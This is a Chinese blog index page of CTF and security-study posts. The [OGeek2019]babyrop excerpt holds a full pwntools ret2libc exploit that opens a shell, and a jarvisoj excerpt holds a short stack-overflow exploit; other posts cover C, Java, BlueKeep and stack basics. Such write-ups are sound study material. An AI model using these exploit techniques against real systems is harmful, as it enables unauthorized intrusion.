<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Pdxbshx</title>
  <meta name="author" content="pdxbshx">
  
  <meta name="description" content="不需要去抱怨什么|">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="Pdxbshx"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="Pdxbshx" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">Pdxbshx</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-user"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>Pdxbshx<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		好好学习,天天向上.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/[OGeek2019]babyrop/" >(OGeek2019)babyrop</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-08-09  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p><strong>read()函数当第一个参数为0时，可能是指示函数从文件或输入流的开头开始读取数据。</strong></p>
<p>首先对程序进行检查<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809004956065.png" alt="image-20230809004956065"></p>
<p>发现不能在本地执行，放入ida中进行查看试试</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005741793.png" alt="image-20230809005741793"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005808197.png" alt="image-20230809005808197"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230809005823231.png" alt="image-20230809005823231"></p>
<p>程序主要实现的功能就是打开&#x2F;dev&#x2F;urandom取出一个随机字符串，read(fd,&amp;buf,4u)是把fd所指向的随机字符串写入到buf文件中，长度是4个字节，v6&#x3D;read(0,buf,0x20u)是将终端输入的0x20个字节读取到buf中，将buf和随机的字符串比较，如果相等就退出程序，不相等就返回v5的值，但是这个函数没有对v5进行处理，可以使用栈溢出，对v5进行赋值，v5的值决定了下一个函数对read在终端读取的字节数，通过对buf局部变量实现栈溢出，构造的exp如下所示：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25845</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">buf = <span class="string">b&quot;\0&quot;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x7</span>-<span class="number">1</span>)+<span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">io.sendline(buf)</span><br><span class="line">io.recvline()</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>)+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">sys_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">io.sendline(buf)</span><br><span class="line">io.recvline()</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>)+p32(sys_addr)+p32(<span class="number">1</span>)+p32(binsh_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到的结果如下所示：</p>
	
	</div>
  <a type="button" href="/uncategorized/[OGeek2019]babyrop/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/C、C++/" >C/C++</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-05-02  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h1><h2 id="1、数组作为函数参数会被退化为指针"><a href="#1、数组作为函数参数会被退化为指针" class="headerlink" title="1、数组作为函数参数会被退化为指针"></a>1、数组作为函数参数会被退化为指针</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> ElemType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"><span class="keyword">typedef</span> ElemType SqBinTree[MaxSize];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateBTree</span><span class="params">(SqBinTree a,ElemType b[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">sizeof</span>(b)/<span class="built_in">sizeof</span>(ElemType);i++)&#123;</span><br><span class="line">        a[i]=b[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SqBinTree a;</span><br><span class="line">    ElemType b[<span class="number">10</span>];</span><br><span class="line">    <span class="comment">//int len;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入一个二叉树: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,b);</span><br><span class="line">    <span class="comment">//len = sizeof(b)/sizeof(ElemType);</span></span><br><span class="line">    <span class="built_in">CreateBTree</span>(a,b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">sizeof</span>(b)/<span class="built_in">sizeof</span>(ElemType);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h3><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230502162911210.png" alt="image-20230502162911210"></p>
<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>C&#x2F;C++中如果一个函数接收一个数组作为参数，那么数组将会被退化为指针。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>如果实在想用**sizeof(b)&#x2F;sizeof(ELemType)**计算出数组的长度，可以现在main()函数里面进行计算，然后再将长度给入到函数中。</p>
	
	</div>
  <a type="button" href="/uncategorized/C、C++/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/Java基础学习/" >Java学习</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-04-19  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="JRE、JDK、JVM"><a href="#JRE、JDK、JVM" class="headerlink" title="JRE、JDK、JVM"></a>JRE、JDK、JVM</h1><p>1、编写代码的过程中，需要使用JRE中Java已经写好的代码。</p>
<p>2、编译代码的过程中，需要使用JDK中的翻译工具。</p>
<p>3、运行代码的过程中，需要使用JDK中的运行工具。</p>
<p>4、代码需要运行在JVM中。</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230806121544787.png" alt="image-20230806121544787"></p>
<h1 id="java类的组织形式"><a href="#java类的组织形式" class="headerlink" title="java类的组织形式"></a>java类的组织形式</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/20230419002700.png"></p>
<h1 id="java-API文档"><a href="#java-API文档" class="headerlink" title="java API文档"></a>java API文档</h1><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20230419003818106.png" alt="image-20230419003818106"></p>
	
	</div>
  <a type="button" href="/uncategorized/Java基础学习/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/第一次作业/" >BlueKeep漏洞的发现与利用</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-01-06  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="BlueKeep漏洞的发现与利用"><a href="#BlueKeep漏洞的发现与利用" class="headerlink" title="BlueKeep漏洞的发现与利用"></a>BlueKeep漏洞的发现与利用</h1><h2 id="漏洞的概述"><a href="#漏洞的概述" class="headerlink" title="漏洞的概述"></a>漏洞的概述</h2><p>2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的windows。修复了 Windows 远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的 Windows 系统。此漏洞是预身份验证，无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用，与2017年 WannaCry 勒索病毒的传播方式类似。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。</p>
<h2 id="漏洞的原理"><a href="#漏洞的原理" class="headerlink" title="漏洞的原理"></a>漏洞的原理</h2><p>存在漏洞的远程桌面服务器，在接收到特殊数据包时会释放一个内部信道 MS_T120 的控制结构体，但并未将指向该结构体的指针删除，而且在远程桌面连接结束之后还会调用 MS_T120 结构体内的一个函数指针，若攻击者可通过远程发送数据重新占据被释放的 MS_T120，并为结构体内的函数指针赋恰当的值，即可实现远程命令执行。</p>
<p>事实上这个漏洞的本质就是一个<strong>UAF漏洞</strong>，那么对于UAF漏洞其实是堆溢出里面的一个知识点，下面简单介绍一下UAF：</p>
<p>uaf的全称为use after free，即在free之后进行使用。<br>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。<br>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。<br>我们也称没有被free的指针称为悬挂指针、野指针。</p>
<p><strong>知识点</strong>：<br>在计算机编程领域中，迷途指针，或称悬空指针、野指针，指的是不指向任何合法的对象的指针<br>当所指向的对象被释放或者收回，但是对该指针没有作任何的修改，以至于该指针仍旧指向已经回收的内存地址，此情况下该指针便称迷途指针。若操作系统将这部分已经释放的内存重新分配给另外一个进程，而原来的程序重新引用现在的迷途指针，则将产生无法预料的后果。因为此时迷途指针所指向的内存现在包含的已经完全是不同的数据。通常来说，若原来的程序继续往迷途指针所指向的内存地址写入数据，这些和原来程序不相关的数据将被损坏，进而导致不可预料的程序错误。这种类型的程序错误，不容易找到问题的原因，通常会导致存储器区块错误（Linux系统中）和一般保护错误（Windows系统中）。如果操作系统的内存分配器将已经被覆盖的数据区域再分配，就可能会影响系统的稳定性。</p>
<h2 id="漏洞的复现"><a href="#漏洞的复现" class="headerlink" title="漏洞的复现"></a>漏洞的复现</h2><h3 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h3>
	
	</div>
  <a type="button" href="/uncategorized/第一次作业/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/第二次作业/" >面向Linux系统下二进制漏洞防御技术的设计与实现</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2023-01-06  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="《面向Linux系统的二进制漏洞防御技术的设计与实现》"><a href="#《面向Linux系统的二进制漏洞防御技术的设计与实现》" class="headerlink" title="《面向Linux系统的二进制漏洞防御技术的设计与实现》"></a>《面向Linux系统的二进制漏洞防御技术的设计与实现》</h2><p>​                                                                                                      作者：路来智，胡雪松</p>
<h2 id="一、阅读总结"><a href="#一、阅读总结" class="headerlink" title="一、阅读总结"></a>一、阅读总结</h2><p>这篇论文向我们介绍了linux环境下程序存在的二进制漏洞，文章整体向我们介绍了二进制漏洞的危害，以及二进制漏洞的演示和防御，阅读完这一篇论文，我理解到了linux下二进制漏洞所存在的条件，即程序中存在危险函数，在编写代码中，函数的调用不安全，容易造成栈溢出、格式化字符串溢出等二进制漏洞，我们避免这种情况只能通过在写代码的过程中，尽量避免使用危险函数。</p>
<h2 id="二、论文分析"><a href="#二、论文分析" class="headerlink" title="二、论文分析"></a>二、论文分析</h2><p>随着开源软件在世界范围内的影响日益增大，linux操作系统在市场上的份额得到了快速地增长，事实上，我们一般客户机上装载的Windows系统，其图形化界面使得操作更加的简单便捷，linux虽然使用起来也没有Windows方便，但是在服务器的使用上，linux更加安全稳定，Linux采取了许多安全技术措施，包括对读、写控制、带保护的子系统、审计跟踪、核心授权等，这为网络多用户环境中的用户提供了必要的安全保障。</p>
<p>文章首先向我们介绍了linux下的程序二进制漏洞包括哪些内容，然后介绍了这些漏洞不去处理的话给我们带来的危害，这些漏洞包括：栈溢出、格式化字符串漏洞、伪造io_file、条件竞争、堆利用等等，最常见的漏洞就是栈溢出，就比如说，我们平常使用c、c++去编写代码的时候，有时候函数用的不对就会对内存造成泄露，而黑客就可以利用好这一点去获取你的信息或者控制你的电脑，然后论文接着介绍了ELF动态链接技术和plt hook技术，ELF 是 unix类操作系统的用于可执行文件、目标代码文件、共享链接库文件与核心转储文件的格式。</p>
<p>当我阅读这篇论文的时候，其实还涉及到了一个知识点，那就是linux的动态链接和静态链接，其实对于这两个概念，我的理解就是，当我想引用一个文章里面的一段文字时，如果我直接将文字赋值到我的文章里面时，那就是静态链接，如果我在我的文章里面附上引用文章的链接让其他人自己去看时，那么这就是动态链接。</p>
<p>根据我的了解，ELF文件由4部分组成，分别是ELF头（ELF header）、程序头表（Program header table）、节（Section）和节头表（Section header table）。实际上，一个文件中不一定包含全部内容，只有ELF头的位置是固定的，其余各部分的位置、大小等信息由ELF头中的各项值来决定。如下图所示，ELF的概述图：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/image-20221208235359065.png" alt="image-20221208235359065"></p>
	
	</div>
  <a type="button" href="/uncategorized/第二次作业/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/第八周笔记/" >第八周笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-11-10  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="ciscn-2019-s-3（系统调用）"><a href="#ciscn-2019-s-3（系统调用）" class="headerlink" title="ciscn_2019_s_3（系统调用）"></a>ciscn_2019_s_3（系统调用）</h1><h2 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h2><p>首先对程序进行分析：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-1.png"></p>
<p>放入ida中反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-2.png"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-3.png"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-4.png"></p>
<p>仔细看了一遍整个程序，发现是系统调用的类型，之前没有接触过，这就让我很头疼，慢慢搜集资料仔细分析一波。</p>
<p>我们发现在地址0x00400517地址处，调用了execve函数，因此我们可以使用execve(&#x2F;bin&#x2F;sh,0,0)来获取我们的flag，此时我们需要的参数对应的寄存器为rax&#x3D;&#x3D;59，rdi&#x3D;&#x3D;’&#x2F;bin&#x2F;sh’，rsi&#x3D;&#x3D;0,  rdx&#x3D;&#x3D;0,  syscall.</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-5.png"></p>
	
	</div>
  <a type="button" href="/uncategorized/第八周笔记/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/linux下的系统调用/" >linux下的系统调用</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-11-07  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="系统调用的原理"><a href="#系统调用的原理" class="headerlink" title="系统调用的原理"></a>系统调用的原理</h2><p>操作系统通过系统调用为运行于其上的进程提供服务。</p>
<p>当用户态进程发起一个系统调用， CPU 将切换到<strong>内核态</strong>并开始执行一个<strong>内核函数</strong>。 内核函数负责响应应用程序的要求。</p>
<p>之前看到过一篇文章，介绍了操作系统就像是一个代理一样，为我们去管理计算机的众多硬件，我们需要计算机的一些计算服务、数据管理的服务，都由操作系统提供接口来完成。这样做的好处是让一般的计算机使用者不用关心硬件的细节。</p>
<p>那对于操作系统来说系统通过接口的方式，建立了用户与计算机硬件的沟通方式，用户通过调用操作系统的接口来使用计算机的各种计算服务。</p>
<p>操作系统一般会提供两个重要的接口来满足用户的一些一般性的使用需求： </p>
<p>1、命令行：实际是一个叫bash&#x2F;sh的端终程序提供的功能，该程序底层的实质还是调用一些操作系统提供的函数。</p>
<p>2、窗口界面：窗口界面通过编写的窗口程序接收来自操作系统消息队列的一些鼠标、键盘动作，进而做出一些响应。</p>
<p>对于非一般性使用需求，操作系统提供了一系列的函数调用给软件开发者，由软件开发者来实现一些用户需要的功能。这些函数调用由于是操作系统内核提供的，为了有别于一般的函数调用，被称为<strong>系统调用</strong>。</p>
<p>这里举个例子，我们c语言使用下的printf函数，它的内部其实就是通过write这个系统调用，让操作系统内核将我们输入的字符打印在屏幕上。</p>
	
	</div>
  <a type="button" href="/uncategorized/linux下的系统调用/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/栈与堆的深入理解/" >栈与堆的深入理解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-11-07  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>前面四周通过学习栈溢出的一些基本知识，学会了解决一些题目，对于pwn这个方向来说，我觉得要想解决难题，就得对栈与堆的理解的更加深刻，所以我选择写这篇文章来对栈与堆的知识点做一个系统的总结（ps：如果有写的不好的地方，欢迎指出修改）</p>
<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈由操作系统自动分配释放 ，用于存放函数的参数值、局部变量等，其操作方式类似于数据结构中的栈。其中函数中定义的局部变量按照先后定义的顺序依次压入栈中，也就是说相邻变量的地址之间不会存在其它变量。栈的内存地址生长方向与堆相反，由高到底，所以后定义的变量地址低于先定义的变量。当然，离开了栈，函数调用也就无法实现，栈总是向下增长的，栈顶是由esp寄存器进行定位，压栈的操作使栈顶的地址减小，弹出的操作使得栈顶的地址增大，栈保存了一个函数所需要维护的信息（堆栈帧或活动记录），堆栈帧一般包括：函数的返回地址和参数，临时变量，保存的上下文（包括在函数调用前后需要保持不变的寄存器），如下图所示：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a-1.png"></p>
<p>一个函数的活动记录主要是通过ebp和esp这两个寄存器划定范围，esp寄存器始终指向栈的顶部，ebp寄存器指向函数活动记录的一个固定位置，我们又可以叫ebp寄存器为帧指针</p>
<p>函数调用时栈的操作如下：</p>
<ul>
<li>把所有的或者一部分参数压入栈中，如果没有其他参数入栈，那么使用某些特定的寄存器传递</li>
<li>把当前指令的下一条指令的地址压入栈中</li>
<li>跳转到函数体执行</li>
<li>push ebp：把ebp压入栈中，为了在函数返回的时候便于恢复以前的ebp值</li>
<li>mov ebp,esp： ebp &#x3D; esp （这时ebp指向栈顶，而此时的栈顶就是old ebp）</li>
</ul>
<p>函数调用结束时：</p>
<ul>
<li>mov esp,ebp：恢复esp同时回收局部变量空间</li>
<li>pop ebp：从栈中恢复保存的ebp的值</li>
<li>ret：从栈中取得返回地址，并跳转到该位置</li>
</ul>
<h3 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h3>
	
	</div>
  <a type="button" href="/uncategorized/栈与堆的深入理解/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/第七周笔记/" >第七周笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-11-07  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>这周主要是对上周的栈迁移知识点进行了更加深的一次了解，然后接着刷题。。。</p>
<h1 id="1、jarvisoj-tell-me-something"><a href="#1、jarvisoj-tell-me-something" class="headerlink" title="1、jarvisoj_tell_me_something"></a>1、jarvisoj_tell_me_something</h1><p>首先对程序进行检查：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-1.png"></p>
<p>为64位程序，然后没有开启canary保护，将其放入ida中进行反编译：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-2.png"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-3.png"></p>
<p>整个函数的结构比较简单，直接就是简单的栈溢出，构造的exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">goodgame_addr=<span class="number">0x00400620</span></span><br><span class="line">p=process(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28897</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(goodgame_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>打通的结果如下：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/7-4.png"></p>
	
	</div>
  <a type="button" href="/uncategorized/第七周笔记/#more" class="btn btn-default more">阅读此文</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/uncategorized/第六周笔记/" >第六周笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-11-07  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="1、jarvisoj-fm（字符串漏洞）"><a href="#1、jarvisoj-fm（字符串漏洞）" class="headerlink" title="1、jarvisoj_fm（字符串漏洞）"></a>1、jarvisoj_fm（字符串漏洞）</h1><p>首先对程序进行检查：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-1.png"></p>
<p>发现开启了canary保护和NX保护，首先就可以排除掉插入shellcode和返回函数，将程序放入ida进行反编译：</p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-2.png"></p>
<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/6-3.png"></p>
<p>很明显，system函数直接暴露在了我们的面前，只需要x满足等于4时即可，通过观察发现x为一个全局变量，我们通过多次运行程序，发现x的默认值为3，接下来的操作主要是找到x的地址，然后将其修改成4即可，这里与之前不同的是，我们在这次用到了fmtstr_payload(偏移，{adds1：value1})，这是32位程序常用的方法，可以构造的exp如下：</p>
